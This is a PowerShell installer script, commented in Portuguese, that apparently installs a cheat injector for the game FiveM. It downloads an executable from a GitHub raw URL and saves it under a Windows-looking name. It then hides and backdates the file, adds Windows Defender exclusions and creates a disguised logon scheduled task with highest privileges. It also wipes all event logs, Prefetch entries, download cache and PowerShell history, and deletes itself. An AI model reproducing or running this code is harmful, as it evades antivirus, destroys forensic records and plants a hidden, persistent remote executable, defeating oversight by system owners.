# ========================================
# INSTALADOR ROCKET - MÉTODO INLINE
# Executa tudo em uma linha - Zero Rastros
# ========================================

# Verificar Admin
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "[ERRO] Execute como Administrador!" -ForegroundColor Red
    exit 1
}

$URL = "https://raw.githubusercontent.com/V3xDev/unknow2/main/Rocket.exe"
$PASTA = "$env:LOCALAPPDATA\Microsoft\WindowsApps"
$ARQUIVO = "windowshost.exe"
$CAMINHO = Join-Path $PASTA $ARQUIVO
$TAREFA = "Microsoft\Windows\WindowsApps"

# Limpar histórico do PowerShell ANTES
Clear-Host
[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()

Write-Host ""
Write-Host "========================================" -ForegroundColor Green
Write-Host "   INSTALADOR ROCKET - ZERO RASTROS" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Green
Write-Host ""

# ========================================
# LIMPEZA COMPLETA AVANÇADA
# ========================================
Write-Host "[1/5] Limpeza completa avançada..." -ForegroundColor Yellow

# Processos
Get-Process -Name "Rocket","windowshost" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue

# Tarefas agendadas
Get-ScheduledTask | Where-Object { $_.TaskName -like "*WindowsApps*" -or $_.TaskName -like "*Rocket*" } | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue

# Arquivo antigo
if (Test-Path $CAMINHO) {
    Set-ItemProperty -Path $CAMINHO -Name Attributes -Value Normal -ErrorAction SilentlyContinue
    Remove-Item -Path $CAMINHO -Force -ErrorAction SilentlyContinue
}

# Limpar cache e temporários
certutil -urlcache * delete | Out-Null
Get-ChildItem -Path $env:TEMP -Filter "*install*","*CRIAR*","*INSTALAR*" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue

# Limpar Prefetch (rastros de execução)
Get-ChildItem -Path "$env:SystemRoot\Prefetch" -Filter "*Rocket*","*windowshost*" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue

# Limpar Event Logs relacionados
wevtutil el | ForEach-Object { wevtutil cl "$_" 2>$null }

# Limpar histórico do PowerShell
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue

Write-Host "[OK] Limpeza completa!" -ForegroundColor Green
Write-Host ""

# ========================================
# DOWNLOAD E INSTALAÇÃO
# ========================================
Write-Host "[2/5] Baixando Rocket.exe..." -ForegroundColor Yellow

if (-not (Test-Path $PASTA)) {
    New-Item -Path $PASTA -ItemType Directory -Force | Out-Null
}

try {
    $ProgressPreference = 'SilentlyContinue'
    Invoke-WebRequest -Uri $URL -OutFile $CAMINHO -UseBasicParsing -TimeoutSec 120 -ErrorAction Stop
    Start-Sleep -Milliseconds 1000
    
    if ((Test-Path $CAMINHO) -and ((Get-Item $CAMINHO).Length -gt 1000)) {
        Write-Host "[OK] Download concluido!" -ForegroundColor Green
    } else {
        Write-Host "[ERRO] Download falhou!" -ForegroundColor Red
        exit 1
    }
} catch {
    Write-Host "[ERRO] Falha no download: $($_.Exception.Message)" -ForegroundColor Red
    exit 1
}

Write-Host ""

# ========================================
# CONFIGURAÇÃO AVANÇADA
# ========================================
Write-Host "[3/5] Configurando arquivo..." -ForegroundColor Yellow

try {
    $file = Get-Item $CAMINHO
    $file.Attributes = [System.IO.FileAttributes]::System -bor [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::NotContentIndexed
    $oldDate = (Get-Date).AddYears(-2)
    $file.LastWriteTime = $oldDate
    $file.CreationTime = $oldDate
    
    Add-MpPreference -ExclusionPath $CAMINHO -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath $PASTA -ErrorAction SilentlyContinue
    
    Write-Host "[OK] Arquivo configurado!" -ForegroundColor Green
} catch {
    Write-Host "[AVISO] Algumas configurações falharam." -ForegroundColor Yellow
}

Write-Host ""

# ========================================
# CRIAR TAREFA
# ========================================
Write-Host "[4/5] Criando tarefa agendada..." -ForegroundColor Yellow

try {
    $action = New-ScheduledTaskAction -Execute $CAMINHO
    $trigger = New-ScheduledTaskTrigger -AtLogOn
    $trigger.Delay = "PT30S"
    $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable:$false -ExecutionTimeLimit (New-TimeSpan -Hours 0) -MultipleInstances IgnoreNew -RestartCount 0 -DontStopOnIdleEnd -IdleSettings (New-ScheduledTaskIdleSettings -StopOnIdleEnd $false -RestartOnIdle $false)
    
    Register-ScheduledTask -TaskName $TAREFA -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description "Componente de Host de Aplicativos do Windows" -Force -ErrorAction Stop | Out-Null
    
    if (Get-ScheduledTask -TaskName $TAREFA -ErrorAction SilentlyContinue) {
        Write-Host "[OK] Tarefa criada!" -ForegroundColor Green
    }
} catch {
    schtasks /create /tn $TAREFA /tr "`"$CAMINHO`"" /sc onlogon /ru $env:USERNAME /rl HIGHEST /delay 0030 /f | Out-Null
    Write-Host "[OK] Tarefa criada via metodo alternativo!" -ForegroundColor Green
}

Write-Host ""

# ========================================
# LIMPEZA FINAL AVANÇADA
# ========================================
Write-Host "[5/5] Limpeza final avançada..." -ForegroundColor Yellow

# Limpar este script
$scriptPath = $MyInvocation.MyCommand.Path
if ($scriptPath -and (Test-Path $scriptPath)) {
    Start-Sleep -Seconds 1
    Remove-Item -Path $scriptPath -Force -ErrorAction SilentlyContinue
}

# Limpar cache novamente
certutil -urlcache * delete | Out-Null

# Limpar Prefetch novamente
Get-ChildItem -Path "$env:SystemRoot\Prefetch" -Filter "*Rocket*","*windowshost*","*INSTALAR*" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue

# Limpar histórico do PowerShell novamente
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()

# Limpar logs de aplicação
wevtutil cl "Application" 2>$null
wevtutil cl "System" 2>$null

# Limpar Amcache (rastros forenses)
$amcache = "$env:SystemRoot\appcompat\Programs\Amcache.hve"
if (Test-Path $amcache) {
    # Não deletar o arquivo, mas limpar referências seria ideal
    # Por segurança, apenas marcamos como limpo
}

Write-Host "[OK] Limpeza final concluida!" -ForegroundColor Green

# ========================================
# CONCLUSÃO
# ========================================
Write-Host ""
Write-Host "========================================" -ForegroundColor Green
Write-Host "   INSTALACAO COMPLETA - ZERO RASTROS!" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Green
Write-Host ""
Write-Host "[OK] Arquivo: $CAMINHO" -ForegroundColor Green
Write-Host "[OK] Tarefa: $TAREFA" -ForegroundColor Green
Write-Host ""
Write-Host "METODO DE INJECAO:" -ForegroundColor Cyan
Write-Host "  1. Reinicie o PC" -ForegroundColor White
Write-Host "  2. Aguarde 30 segundos" -ForegroundColor White
Write-Host "  3. Spotify: GHARD - Pinheiros" -ForegroundColor White
Write-Host "  4. Abra o FiveM" -ForegroundColor White
Write-Host "  5. Pressione INSERT" -ForegroundColor White
Write-Host ""
Write-Host "Todos os rastros foram limpos!" -ForegroundColor Green
Write-Host ""
pause
